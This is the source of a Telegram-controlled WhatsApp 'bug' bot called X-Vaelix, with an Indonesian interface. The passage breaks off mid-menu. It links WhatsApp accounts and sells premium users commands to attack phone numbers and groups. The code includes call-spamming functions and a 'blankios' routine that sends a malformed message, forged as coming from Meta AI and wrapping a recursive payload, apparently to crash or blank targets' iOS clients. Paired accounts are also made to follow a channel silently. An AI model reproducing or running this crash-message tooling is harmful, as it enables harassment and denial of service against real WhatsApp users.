const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require('@bellaxchuu/xbailey');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const crypto = require("crypto");
const renlol = fs.readFileSync("./assets/images/thumb.jpeg");
const FormData = require('form-data');
const path = require("path");
const sessions = new Map();
const readline = require("readline");
const cd = "cooldown.json";
const https = require("https")
const sharp = require("sharp");
const { v4, uuidv4 } = require("uuid")
const { pipeline } = require("stream")
const { promisify } = require("util")
const streamPipeline = promisify(pipeline)
const { OpenAI } = require("openai");
const { GoogleGenAI } = require("@google/genai");
const vm = require('vm');
const axios = require("axios");
const chalk = require("chalk");
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

let premiumUsers = JSON.parse(fs.readFileSync("./premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./admin.json"));

function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}

ensureFileExists("./premium.json");
ensureFileExists("./admin.json");

function savePremiumUsers() {
  fs.writeFileSync("./premium.json", JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
  fs.writeFileSync("./admin.json", JSON.stringify(adminUsers, null, 2));
}

function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`bot ${botNum}:`, error);
      }
    }
  });
}

watchFile("./premium.json", (data) => (premiumUsers = data));
watchFile("./admin.json", (data) => (adminUsers = data));

const GITHUB_TOKEN_LIST_URL =
  "";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens;
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }

  console.log(chalk.green(` X-Vaelix CRASH IS BACK ⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`
████████████████████████████████████████████
██▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░▒▒▒▒▒▒▒▒▒▒▒▒██
██▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒██
██▒▒▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒▒▒██
██▒▒▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒▒▒▒██
██▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▄░░▒▒▒██
██▒▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▌░░▒▒██
██▒▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░▄▄███▀░░░░▒██
██▒▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░█████░▄█░░░░██
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄████████▀░░░░██
██▒▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░██
██▒░░░░░░░░░░░░░░░░░░░░░░░░░░▄███████▌░░░░░░░██
██▒░░░░░░░░░░░░░░░░░░░░░░░░▄█████████░░░░░░░░██
██▒░░░░░░░░░░░░░░░░░░░░░▄███████████▌░░░░░░░░██
██▒░░░░░░░░░░░░░░░▄▄▄▄██████████████▌░░░░░░░░██
██▒░░░░░░░░░░░▄▄███████████████████▌░░░░░░░░░██
██▒░░░░░░░░░▄██████████████████████▌░░░░░░░░░██
██▒░░░░░░░░████████████████████████░░░░░░░░░░██
██▒█░░░░░▐██████████▌░▀▀███████████░░░░░░░░░░██
██▐██░░░▄██████████▌░░░░░░░░░▀██▐█▌░░░░░░░░░▒██
██▒██████░█████████░░░░░░░░░░░▐█▐█▌░░░░░░░░░▒██
██▒▒▀▀▀▀░░░██████▀░░░░░░░░░░░░▐█▐█▌░░░░░░░░▒▒██
██▒▒▒▒▒░░░░▐█████▌░░░░░░░░░░░░▐█▐█▌░░░░░░░▒▒▒██
██▒▒▒▒▒▒░░░░███▀██░░░░░░░░░░░░░█░█▌░░░░░░▒▒▒▒██
██▒▒▒▒▒▒▒▒░▐██░░░██░░░░░░░░▄▄████████▄▒▒▒▒▒▒▒██
██████████████████████████████████████████████

`));


console.log(chalk.greenBright(`
[!]X-Vaelix IS ONLINE
`));

console.log(chalk.blueBright(`
[!]X-Vaelix IS ONLINE
`
));
};

startBot();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sock.newsletterFollow("120363425270610135@newsletter");
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`◇ 𝙋𝙧𝙤𝙨𝙚𝙨𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`◇ 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧 ${botNumber}..... 𝙨𝙪𝙘𝙘𝙚𝙨\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
      sock.newsletterFollow("120363425270610135@newsletter");
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`js◇ 𝙎𝙪𝙘𝙘𝙚𝙨 𝙥𝙧𝙤𝙨𝙚𝙨 𝙥𝙖𝙞𝙧𝙞𝙣𝙜
𝙔𝙤𝙪𝙧 𝙘𝙤𝙙𝙚 : ${formattedCode}\`\`\``,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`◇ 𝙂𝙖𝙜𝙖𝙡 𝙢𝙚𝙡𝙖𝙠𝙪𝙠𝙖𝙣 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙠𝙚 𝙣𝙤𝙢𝙤𝙧  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}


function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;

  return `${days} Hari,${hours} Jam,${minutes} Menit`
}

const startTime = Math.floor(Date.now() / 1000);

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime);
}

function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options);
}

function getRandomImage() {
  const images = [
    "https://files.catbox.moe/cedglx.jpg",
  ];
  return images[Math.floor(Math.random() * images.length)];
}

const bagUrl = "https://files.catbox.moe/cedglx.jpg";
const ownerUrl = "https://files.catbox.moe/cedglx.jpg";
const bugUrl = "https://files.catbox.moe/cedglx.jpg";

const menuEffects = [
  "5226928895189598791",
  "5256047523620995497",
  "5389038097860144794",
  "5325707675504222689"
];

let cooldownData = fs.existsSync(cd)
  ? JSON.parse(fs.readFileSync(cd))
  : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
  fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
  if (cooldownData.users[userId]) {
    const remainingTime =
      cooldownData.time - (Date.now() - cooldownData.users[userId]);
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000);
    }
  }
  cooldownData.users[userId] = Date.now();
  saveCooldown();
  setTimeout(() => {
    delete cooldownData.users[userId];
    saveCooldown();
  }, cooldownData.time);
  return 0;
}

function setCooldown(timeString) {
  const match = timeString.match(/(\d+)([smh])/);
  if (!match) return "Format salah! Gunakan contoh: /cd 5m";

  let [_, value, unit] = match;
  value = parseInt(value);

  if (unit === "s") cooldownData.time = value * 1000;
  else if (unit === "m") cooldownData.time = value * 60 * 1000;
  else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

  saveCooldown();
  return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find((user) => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `Ya - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "Tidak - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
  if (!link.includes("https://whatsapp.com/channel/"))
    return { error: "Link tidak valid!" };

  let channelId = link.split("https://whatsapp.com/channel/")[1];
  try {
    let res = await sock.newsletterMetadata("invite", channelId);
    return {
      id: res.id,
      name: res.name,
      subscribers: res.subscribers,
      status: res.state,
      verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak",
    };
  } catch (err) {
    return { error: "Gagal mengambil data! Pastikan channel valid." };
  }
}

function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

async function spamcall(target) {
  const sock = makeWASocket({
    printQRInTerminal: false,
  });

  try {
    console.log(`📞 Mengirim panggilan ke ${target}`);

    await sock.query({
      tag: "call",
      json: ["action", "call", "call", { id: `${target}` }],
    });

    console.log(`✅ Berhasil mengirim panggilan ke ${target}`);
  } catch (err) {
    console.error(`⚠️ Gagal mengirim panggilan ke ${target}:`, err);
  } finally {
    sock.ev.removeAllListeners();
    sock.ws.close();
  }
}

async function sendOfferCall(target) {
  try {
    await sock.offerCall(target);
    console.log(chalk.white.bold(`Success Send Offer Call To Target`));
  } catch (error) {
    console.error(chalk.white.bold(`Failed Send Offer Call To Target:`, error));
  }
}

async function sendOfferVideoCall(target) {
  try {
    await sock.offerCall(target, {
      video: true,
    });
    console.log(chalk.white.bold(`Success Send Offer Video Call To Target`));
  } catch (error) {
    console.error(
      chalk.white.bold(`Failed Send Offer Video Call To Target:`, error)
    );
  }
}

const buffer1 = {
  "interactiveMessage": {
    "interactiveMessage": {
      "header": {
        "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
        "subtitle": "666",
        "hasMediaAttachment": false
      },
      "body": { "text": "Apa yang ingin anda lakukan?" },
      "footer": { "text": "Nishiki" },
      "nativeFlowMessage": {
        "buttons": [
          { "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Opsi 1\",\"id\":\"opt_1\"}" },
          { "name": "quick_reply", "buttonParamsJson": "{\"display_text\":\"Opsi 3\",\"id\":\"opt_3\"}" }
        ],
        "messageParamsJson": "{}"
      },
      "mtype": "interactiveMessage",
      "id": "3EB002CBD0A177798DC757",
      "chat": "135759822622788@lid",
      "isBaileys": false,
      "sender": "215178549395532@lid",
      "fromMe": false,
      "text": "",
      "mentionedJid": [],
      "fakeObj": {
        "messageStubParameters": [],
        "labels": [],
        "userReceipt": [],
        "reactions": [],
        "pollUpdates": [],
        "eventResponses": [],
        "statusMentions": [],
        "messageAddOns": [],
        "statusMentionSources": [],
        "supportAiCitations": [],
        "key": "[SENSITIVE_DATA_OMITTED]",
        "message": {
          "interactiveMessage": {
            "header": {
              "title": "🪭𝚂𝙴𝙲𝚁𝙴𝚃 ♕ 𝙲𝙾𝙼𝙿𝙰𝙽𝚈🪭",
              "subtitle": "666",
              "hasMediaAttachment": false
            },
            "body": { "text": "Apa yang ingin anda lakukan?" },
            "footer": { "text": "Nishiki" },
            "nativeFlowMessage": {
              "buttons": ["[TRUNCATED_DEPTH]", "[TRUNCATED_DEPTH]"],
              "messageParamsJson": "{}"
            },
            "mtype": "interactiveMessage",
            "id": "3EB002CBD0A177798DC757",
            "chat": "135759822622788@lid",
            "isBaileys": false,
            "sender": "215178549395532@lid",
            "fromMe": false,
            "text": "",
            "mentionedJid": [],
            "fakeObj": {
              "messageStubParameters": [],
              "labels": [],
              "userReceipt": [],
              "reactions": [],
              "pollUpdates": [],
              "eventResponses": [],
              "statusMentions": [],
              "messageAddOns": [],
              "statusMentionSources": [],
              "supportAiCitations": [],
              "key": "[SENSITIVE_DATA_OMITTED]",
              "message": { "interactiveMessage": "[TRUNCATED_DEPTH]" }
            },
            "delete": "[FUNCTION]",
            "copyNForward": "[FUNCTION]",
            "download": "[FUNCTION]"
          }
        }
      },
      "delete": "[FUNCTION]",
      "copyNForward": "[FUNCTION]",
      "download": "[FUNCTION]"
    }
  }
};

let stringifiedData;
try {
  stringifiedData = JSON.stringify(buffer1, null, 2);
} catch (stringifyErr) {
  console.error(stringifyErr.message);
}

const buffer = Buffer.from(stringifiedData, 'utf8');


async function blankios(sock, target) {
    const MakLoX = { 
        botForwardedMessage: { 
            message: {
                richResponseMessage: { 
                    messageType: "AI_RICH_RESPONSE_TYPE_STANDARD",
                    submessages: [{ messageType: "AI_RICH_RESPONSE_TEXT", messageText: "MakLo" }],
                    unifiedResponse: { 
                        data: Buffer.from(JSON.stringify({ 
                            response_id: "666",
                            sections: [
                                { 
                                    view_model: { 
                                        primitive: { 
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel" 
                                    } 
                                }, 
                                { 
                                    view_model: { 
                                        primitive: { 
                                            language: "Gunma",
                                            code_blocks: [
                                                { "content": "MakLo🪭\n\n\n", "type": "NUMBER" },
                                                { "content": buffer, "type": "STR" }
                                            ],
                                            __typename: "GenAICodeUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel" 
                                    } 
                                }, 
                                { 
                                    view_model: { 
                                        primitive: { 
                                            text: "",
                                            __typename: "GenAIMarkdownTextUXPrimitive" 
                                        },
                                        __typename: "GenAISingleLayoutViewModel"
                                    }
                                }
                            ]
                        })).toString("base64")
                    },
                    contextInfo: { 
                        forwardingScore: 1, 
                        isForwarded: true,
                        forwardedAiBotMessageInfo: { 
                            botName: "Meta AI",
                            botJid: "13135550002@s.whatsapp.net", 
                            creatorName: "Meta"
                        }
                    }
                }
            }
        }
    };
    
    const msg = generateWAMessageFromContent(target, MakLoX, {});
    
    sock.relayMessage(target, msg.message, { 
  noSelfSync: true,  
  messageId: msg.key.id, 
 });
}

const keyboardIntervals = {};
const userMode = {};

function buildKeyboard(style) {
  return [
    [
      { text: "𝗫-𝗩𝗔𝗘𝗟𝗜𝗫", callback_data: "erenmenu", style: style , icon_custom_emoji_id: "5465265370703080100" },
      { text: "𝗫𝗦𝗘𝗧𝗧𝗜𝗡𝗚𝗦", callback_data: "menu", style: style , icon_custom_emoji_id: "5226928895189598791" }
    ],
    [
      { text: "𝗫𝗦𝗨𝗣𝗣𝗢𝗥𝗧", callback_data: "TqTo", style: style , icon_custom_emoji_id: "5256047523620995497" },
      { text: "𝗫𝗧𝗢𝗢𝗟𝗦", callback_data: "menuTools", style: style , icon_custom_emoji_id: "5438496463044752972" }
    ],
    [
      { text: "𝗔𝗨𝗧𝗛𝗢𝗥", url: "https://DarlinNyc", style: style , icon_custom_emoji_id: "5433758796289685818" }
    ],
  ];
}

function getUserStyle(mode) {
  if (mode === "color_red") return "danger";
  if (mode === "color_green") return "success";
  if (mode === "color_yellow") return "primary";
  return "primary";
}

function startDisco(chatId, messageId) {
  stopDisco(chatId);

  const styles = ["primary", "danger", "success"];
  let index = 0;

  keyboardIntervals[chatId] = setInterval(() => {
    index = (index + 1) % styles.length;

    bot.editMessageReplyMarkup(
      { inline_keyboard: buildKeyboard(styles[index]) },
      { chat_id: chatId, message_id: messageId }
    ).catch(()=>{});

  }, 2000);
}

function stopDisco(chatId) {
  if (keyboardIntervals[chatId]) {
    clearInterval(keyboardIntervals[chatId]);
    delete keyboardIntervals[chatId];
  }
}

async function sendMenu(chatId, caption, keyboard) {
  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: keyboard }
  });

  return sent.message_id;
}

function colorMenu() {
  return {
    inline_keyboard: [
      [
        { text: "𝖡𝗅𝗈𝗈𝖽", callback_data: "color_red" , style: "danger" , icon_custom_emoji_id: "5463250708918711044" },
        { text: "𝖦𝗋𝖾𝖾𝗇", callback_data: "color_green" , style: "success" , icon_custom_emoji_id: "5195111279244619776" }
      ],
      [
        { text: "𝖸𝖾𝗅𝗅𝗈𝗐", callback_data: "color_yellow" , style: "primary" , icon_custom_emoji_id: "6097934939829839073" },
        { text: "𝖣𝗂𝗌𝖼𝗈", callback_data: "color_disco" , style: "success" , icon_custom_emoji_id: "5257960214291823402" }
      ]
    ]
  };
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

bot.onText(/\/start/, async (msg) => {
  
  const chatId = msg.chat.id;
  const userId = msg.from.id
  const username = msg.from.username ? `@${msg.from.username}` : "User";
let joined = await checkJoined(userId)

if (!joined) {
return sendJoinMessage(chatId)
}
  stopDisco(chatId);
  
  const sent = await bot.sendPhoto(chatId, getRandomImage(), {
    caption: `<b><blockquote><tg-emoji emoji-id="5229011542011299168">👑</tg-emoji>X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed</blockquote></b>
<b>↯ Developer  : @DarlinNyc
↯ Platform    : Telegram
↯ type script : Bebas spam bugs</b>
<b><blockquote><tg-emoji emoji-id="6129739490484294910">👑</tg-emoji>Version Script</blockquote></b>
<b>↯ Version    : 1.0 Beta</b>
<b><blockquote><tg-emoji emoji-id="5258011929993026890">👤</tg-emoji>𝖨𝗇𝖿𝗈𝗋𝗆𝖺𝗍𝗂𝗈𝗇 𝖴𝗌𝖾𝗋</blockquote></b>
<b>↯ Username: ${username}</b>
<blockquote><tg-emoji emoji-id="6204177183598974956">⬇️</tg-emoji> 𝚂𝙴𝙻𝙴𝙲𝚃 𝚃𝙷𝙴 𝙱𝚄𝚃𝚃𝙾𝙽 </blockquote>`,
    parse_mode: "HTML",
    reply_markup: colorMenu()
  });

  userMode[chatId] = {
    mode: null,
    msgId: sent.message_id
  };

});

bot.on("callback_query", async (query) => {
  try {
    if (!query.message || !query.data) return;

    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const senderId = query.from.id;
    const data = query.data;

    await bot.answerCallbackQuery(query.id).catch(()=>{});

    if (data !== "color_disco") stopDisco(chatId);

    const runtime = getBotRuntime();
    const developer = "@DarlinNyc"
    const memory = formatMemory();
    const cooldown = checkCooldown(senderId);
    const premiumStatus = getPremiumStatus(senderId);

    let caption = "";
    let replyMarkup = {};

    if (data.startsWith("color_")) {
      userMode[chatId] = data;

      if (data === "color_disco") {
        startDisco(chatId, messageId);
      } else {
        const style = getUserStyle(data);
        await bot.editMessageReplyMarkup(
          { inline_keyboard: buildKeyboard(style) },
          { chat_id: chatId, message_id: messageId }
        );
      }
      return;
    }

    else if (data === "back_to_main") {
  const style = getUserStyle(userMode[chatId] || "color_green");

  caption = `\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}
\`\`\``;

  replyMarkup = {
    inline_keyboard: buildKeyboard(style)
  };
}


    else if (data === "erenmenu") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Delay <——✠—««
𖥊  - /xbugs    ➜ 628xxxx
𖥊  - /xkill      ➜ 628xxxx
𖥊  - /xynerx    ➜ 628xxxx
𖥊  - /zypherx   ➜ 628xxxx
𖥊  - /xivorx     ➜ 628xxxx
\`\`\`
`;

      replyMarkup = {
  inline_keyboard: [
    [
      {
        text: "𝗫𝗜𝗣𝗛𝗢𝗡𝗘",
        callback_data: "erenmenu2",
        style: "danger",
        icon_custom_emoji_id: "4970075093381153851"
      },
      {
        text: "𝗫𝗙𝗢𝗥𝗖𝗟𝗢𝗦𝗘",
        callback_data: "erenmenu3",
        style: "danger",
        icon_custom_emoji_id: "6097996297732625001"
      }
    ],
    [
      {
        text: "𝗡𝗢𝗧 𝗦𝗣𝗔𝗠",
        callback_data: "erenmenu4",
        style: "danger",
        icon_custom_emoji_id: "6098059974917755974"
      },
      {
        text: " 𝗕𝗨𝗚 𝗚𝗥𝗢𝗨𝗣",
        callback_data: "erenmenu5",
        style: "danger",
        icon_custom_emoji_id: "6206505206197261313"
      }
    ],
    [
      {
        text: "𝗫𝗕𝗔𝗖𝗞",
        callback_data: "back_to_main",
        style: "success",
        icon_custom_emoji_id: "6206505206197261313"
      }
    ]
  ]
};

}

else if (data === "erenmenu2") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas Spam Bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Ios <——✠—««
𖥊. - /noctex     ➜ 628xxxx
𖥊. - /qexon      ➜ 628xxxx
𖥊. - /hecte      ➜ 628xxxx
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "erenmenu", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

    else if (data === "erenmenu3") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Froclose <——✠—««
𖥊. - /foreclx      ➜ 628xxxx
𖥊. - /forexit       ➜ 628xxxx
𖥊. - /forcloz      ➜ 628xxxx
𖥊. - /fconemsg   ➜ 628xxxx
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "erenmenu", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

    else if (data === "erenmenu4") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – 
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Visible <——✠—««
𖥊. - /forceclick    ➜ 628xxxx
𖥊. - /Blank  ➜ 628xxxx
𖥊. - /BlankV2  ➜ 628xxxx
»»—✠——> X-Vaelix ☩ Not Spam <——✠—««
𖥊. - /buldozer   ➜ 628xxxx
𖥊  - /xfc     ➜ 628xxxx
\`\`\`
`;
      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "erenmenu", 
            style: "success" , icon_custom_emoji_id: "6206505206197261313" }
          ]
        ]
      };

    }

          else if (data === "erenmenu5") {

      caption = `
\`\`\`javascript
X-Vaelix Infinity – 𝖲𝗎𝗉𝖾𝗋 – Speed
↯ Developer  : ${developer}
↯ Version    : 1.0
↯ type script : Bebas spam bugs
↯ Premium   : ${premiumStatus}
↯ Cooldown  : ${cooldown}

»»—✠——> X-Vaelix ☩ Group <——✠—««
𖥊. - /delaygc    ➜ link group
𖥊. - /blankgc    ➜ link group
𖥊. - /bangc    ➜ link group
\`\`\`
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗫𝗕𝗔𝗖𝗞",
            callback_data: "erenmenu", 
